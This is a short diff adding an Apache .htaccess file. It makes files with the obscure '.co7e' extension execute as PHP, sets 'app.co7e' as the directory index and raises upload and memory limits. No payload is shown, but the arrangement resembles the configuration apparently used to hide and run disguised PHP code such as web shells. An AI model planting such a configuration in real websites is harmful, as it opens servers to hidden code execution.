@@ -1,0 +1,13 @@
+DirectoryIndex app.co7e
+
+<FilesMatch ".(?:co7e)$">
+    #SetHandler application/x-lsphp74
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+php_value file_uploads true
+php_value max_file_uploads 10
+php_value upload_max_filesize 25M
+php_value post_max_size 250M
+php_value max_input_time 10
+php_value memory_limit 512M
